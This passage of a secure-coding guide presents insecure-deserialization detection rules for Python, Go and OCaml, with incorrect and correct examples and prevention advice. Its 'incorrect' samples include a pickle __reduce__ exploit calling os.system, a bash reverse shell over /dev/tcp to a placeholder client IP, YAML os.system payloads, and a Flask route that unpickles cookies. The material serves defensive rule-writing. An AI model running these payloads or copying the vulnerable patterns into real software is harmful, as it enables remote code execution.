    return "Hey there! {}!".format(_pickle.loads(user_obj))

def current_datetime(request):
    user_obj = request.cookies.get('uuid')
    # ruleid:avoid-insecure-deserialization
    return "Hey there! {}!".format(cPickle.loads(user_obj))

def current_datetime(request):
    user_obj = request.cookies.get('uuid')
    # ruleid:avoid-insecure-deserialization
    return "Hey there! {}!".format(dill.loads(b64decode(user_obj)))

def current_datetime(request):
    user_obj = request.cookies.get('uuid')
    # ruleid:avoid-insecure-deserialization
    return "Hey there! {}!".format(shelve.loads(user_obj))

def current_datetime(request):
    user_obj = request.cookies.get('uuid')
    # ruleid:avoid-insecure-deserialization
    return "Hey there! {}!".format(yaml.load(b64decode(user_obj)))
```

**Correct (use safe data sources):**
```python
from django.http import HttpResponse
import datetime

def current_datetime(request):
    user_obj = request.cookies.get('uuid')
    now = datetime.datetime.now()
    html = "<html><body>It is now %s.</body></html>" % now

    # ok:avoid-insecure-deserialization
    return "Hey there! {}!".format(pickle.loads(b64decode(html)))
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [Python pickle Documentation](https://docs.python.org/3/library/pickle.html)

---

#### Pickle/cPickle/dill/shelve Usage

**Incorrect (using pickle-based libraries):**
```python
# Import dependencies
import os
import _pickle

# Attacker prepares exploit that application will insecurely deserialize
class Exploit(object):
    def __reduce__(self):
        return (os.system, ("whoami",))


# Attacker serializes the exploit
def serialize_exploit():
    # ruleid: avoid-pickle
    shellcode = _pickle.dumps(Exploit())
    return shellcode


# Application insecurely deserializes the attacker's serialized data
def insecure_deserialization(exploit_code):
    # ruleid: avoid-pickle
    _pickle.loads(exploit_code)


# Application insecurely deserializes the attacker's serialized data
def insecure_deserialization_2(exploit_code):
    import _pickle as adaasfa

    # ruleid: avoid-pickle
    adaasfa.loads(exploit_code)


import cPickle
import socket


class Shell_code(object):
    def __reduce__(self):
        return (
            os.system,
            ('/bin/bash -i >& /dev/tcp/"Client IP"/"Listening PORT" 0>&1',),
        )


# ruleid: avoid-cPickle
shell = cPickle.dumps(Shell_code())

import dill

# ruleid: avoid-dill
shell = dill.dumps(Shell_code())

import shelve

# ruleid: avoid-shelve
myShelve = shelve.open(Shell_code())
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [Python pickle Documentation](https://docs.python.org/3/library/pickle.html)

---

#### PyYAML Unsafe Load

**Incorrect (using unsafe YAML loaders):**
```python
import yaml


#ruleid:avoid-pyyaml-load
yaml.unsafe_load("!!python/object/new:os.system [echo EXPLOIT!]")

def thing(**kwargs):
    #ruleid:avoid-pyyaml-load
    yaml.unsafe_load("!!python/object/new:os.system [echo EXPLOIT!]", **kwargs)

def other_thing(**kwargs):
    #ruleid:avoid-pyyaml-load
    yaml.load("!!python/object/new:os.system [echo EXPLOIT!]", Loader=yaml.Loader, **kwargs)

def other_thing_two(**kwargs):
    #ruleid:avoid-pyyaml-load
    yaml.load("!!python/object/new:os.system [echo EXPLOIT!]", Loader=yaml.UnsafeLoader, **kwargs)

def other_thing_three(**kwargs):
    #ruleid:avoid-pyyaml-load
    yaml.load("!!python/object/new:os.system [echo EXPLOIT!]", Loader=yaml.CLoader, **kwargs)

def other_thing_four(**kwargs):
    #ruleid:avoid-pyyaml-load
    yaml.load_all("!!python/object/new:os.system [echo EXPLOIT!]", Loader=yaml.Loader, **kwargs)

def other_thing_five(**kwargs):
    #ruleid:avoid-pyyaml-load
    yaml.load_all("!!python/object/new:os.system [echo EXPLOIT!]", Loader=yaml.UnsafeLoader, **kwargs)

def other_thing_six(**kwargs):
    #ruleid:avoid-pyyaml-load
    yaml.load_all("!!python/object/new:os.system [echo EXPLOIT!]", Loader=yaml.CLoader, **kwargs)
```

**Correct (use SafeLoader or CSafeLoader):**
```python
import yaml

def this_is_ok(stream):
    #ok:avoid-pyyaml-load
    return yaml.load(stream, Loader=yaml.CSafeLoader)

def this_is_also_ok(stream):
    #ok:avoid-pyyaml-load
    return yaml.load(stream, Loader=yaml.SafeLoader)

def this_is_additionally_ok(stream):
    #ok:avoid-pyyaml-load
    return yaml.load_all(stream, Loader=yaml.CSafeLoader)

def this_is_ok_too(stream):
    #ok:avoid-pyyaml-load
    return yaml.load_all(stream, Loader=yaml.SafeLoader)

def this_is_ok_as_well(stream):
    #ok:avoid-pyyaml-load
    return yaml.load(stream, Loader=yaml.BaseLoader)

def this_is_ok_too_two(stream):
    #ok:avoid-pyyaml-load
    return yaml.load_all(stream, Loader=yaml.BaseLoader)

def check_ruamel_yaml():
    from ruamel.yaml import YAML
    yaml = YAML(typ="rt")
    # ok:avoid-pyyaml-load
    yaml.load("thing.yaml")
    # ok:avoid-pyyaml-load
    yaml.load_all("thing.yaml")
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [PyYAML yaml.load() Deprecation](https://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load(input)-Deprecation)
- [CVE-2017-18342](https://nvd.nist.gov/vuln/detail/CVE-2017-18342)

---

#### ruamel.yaml Unsafe Types

**Incorrect (using unsafe typ parameter):**
```python
from ruamel.yaml import YAML

#ruleid:avoid-unsafe-ruamel
y3 = YAML(typ='unsafe')

#ruleid:avoid-unsafe-ruamel
y4 = YAML(typ='base')
```

**Correct (use default 'rt' or 'safe' typ):**
```python
from ruamel.yaml import YAML

#ok:avoid-unsafe-ruamel
y1 = YAML()  # default is 'rt'

#ok:avoid-unsafe-ruamel
y2 = YAML(typ='rt')

#ok:avoid-unsafe-ruamel
y3 = YAML(typ='safe')
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [ruamel.yaml Basic Use](https://yaml.readthedocs.io/en/latest/basicuse.html?highlight=typ)

---

#### jsonpickle Deserialization

**Incorrect (using jsonpickle.decode with user input):**
```python
import jsonpickle

def run_payload(payload: str) -> None:
    # ruleid: avoid-jsonpickle
    obj = jsonpickle.decode(payload)
```

**Correct (use hardcoded strings):**
```python
import jsonpickle

def ok():
    # ok: avoid-jsonpickle
    obj = jsonpickle.decode('foobar')
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [jsonpickle GitHub](https://github.com/jsonpickle/jsonpickle#jsonpickle)
- [jsonpickle Exploit](https://www.exploit-db.com/exploits/49585)

---

#### marshal Module Usage

**Incorrect (using marshal.dumps/loads):**
```python
import marshal

fin = open('index.mar')
for line in fin:
    # ruleid: marshal-usage
    marshal.dumps(line)
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [Python marshal Security Warning](https://docs.python.org/3/library/marshal.html?highlight=security)

---

#### multiprocessing Connection.recv()

**Incorrect (using Connection.recv() without authentication):**
```python
import multiprocessing
import multiprocessing.connection


rx = multiprocessing.connection.Client(('localhost', 12345)).recv()

# ruleid: multiprocessing-recv
connection = multiprocessing.connection.Client(
    ('localhost', 12345),
)

output = {}
connection.send(output)

# toodoruleid:multiprocessing.recv
rx = connection.recv()
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [Python multiprocessing Connection Security](https://docs.python.org/3/library/multiprocessing.html?highlight=security#multiprocessing.connection.Connection)

---

#### Flask Insecure Deserialization

**Incorrect (using pickle in Flask routes):**
```python
# flask_app.py
import os
import pickle
from uuid import uuid1
from flask import Flask, make_response, request
from base64 import b64encode, b64decode

class UserID:
    def __init__(self, uuid=None):
        self.uuid = str(uuid1())
    def __str__(self):
        return self.uuid

app = Flask(__name__)

@app.route('/', methods=['GET'])
def index():
    user_obj = request.cookies.get('uuid')
    if user_obj == None:
        msg = "Seems like you didn't have a cookie. No worries! I'll set one now!"
        response = make_response(msg)
        user_obj = UserID()
        # ruleid:insecure-deserialization
        response.set_cookie('uuid', b64encode(pickle.dumps(user_obj)))
        return response
    else:
        # ruleid:insecure-deserialization
        return "Hey there! {}!".format(pickle.loads(b64decode(user_obj)))
```

**Correct (load from trusted file sources):**
```python
@app.route("/ok")
def ok():
    # ok:insecure-deserialization
    novellist = pickle.load(open('./novel/list.dat', "rb"))
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [Python pickle Documentation](https://docs.python.org/3/library/pickle.html)

---

#### AWS Lambda Tainted Pickle Deserialization

**Incorrect (deserializing Lambda event data):**
```python
import _pickle
import cPickle
from dill import loads
import shelve


def lambda_handler(event, context):

  # ruleid: tainted-pickle-deserialization
  _pickle.load(event['exploit_code'])

  # ruleid: tainted-pickle-deserialization
  obj = cPickle.loads(f"foobar{event['exploit_code']}")

  # ruleid: tainted-pickle-deserialization
  loads(event['exploit_code'])(123)

  # ruleid: tainted-pickle-deserialization
  with shelve.open(f"/tmp/path/{event['object_path']}") as db:
    db['eggs'] = 'eggs'
```

**Correct (use hardcoded or safe data):**
```python
def lambda_handler(event, context):

  # ok: tainted-pickle-deserialization
  _pickle.loads('hardcoded code')

  # ok: tainted-pickle-deserialization
  code = '/file/path'
  cPickle.load(code)

  # ok: tainted-pickle-deserialization
  name = 'foobar'
  shelve.open(f"/tmp/path/{name}")
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [Python pickle Documentation](https://docs.python.org/3/library/pickle.html)
- [Exploiting Python Pickle](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)

---

### Language: Go

#### Dynamic httptrace ClientTrace

**Incorrect (using dynamic ClientTrace):**
```go
package uhoh

import (
	"context"
	"net"
	"net/http"
	"net/http/httptrace"
)

func WithTrace(req *http.Request, trace *httptrace.ClientTrace) *http.Request {
    // ruleid: dynamic-httptrace-clienttrace
	return req.WithContext(httptrace.WithClientTrace(req.Context(), trace))
}
```

**References:**
- CWE-913: Improper Control of Dynamically-Managed Code Resources
- [GitHub Issue: Dynamic ClientTrace](https://github.com/returntocorp/semgrep-rules/issues/518)

---

### Language: OCaml

#### Marshal Deserialization

**Incorrect (using Marshal.input_value):**
```ocaml
(* ruleid:ocamllint-marshal *)
let d = input_value stdin in
  Printf.printf "%d\n" (Buffer.length d)
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [Secure OCaml Sandbox](https://eternal.red/2021/secure-ocaml-sandbox/)

---

## General Prevention Guidelines

1. **Never deserialize untrusted data** - Treat all external data as potentially malicious
2. **Use JSON for data interchange** - JSON only returns primitive types (strings, arrays, objects, numbers, null)
3. **Implement integrity checks** - Use HMACs to sign serialized data to detect tampering
4. **Use allowlists for deserialization** - Only allow specific, known-safe classes to be deserialized
5. **Avoid native serialization formats** - pickle, Marshal, ObjectInputStream, BinaryFormatter are all dangerous
6. **Use safe YAML loaders** - Always use SafeLoader or CSafeLoader with PyYAML
7. **Disable type resolution** - For JSON libraries, disable TypeNameHandling or equivalent features
8. **Monitor and log deserialization** - Alert on unexpected deserialization attempts
9. **Keep libraries updated** - Apply security patches promptly
10. **Consider alternatives** - Protocol Buffers, FlatBuffers, or JSON Schema for structured data

**References:**
- CWE-502: Deserialization of Untrusted Data
- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [OWASP Top 10 A08:2021 - Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)
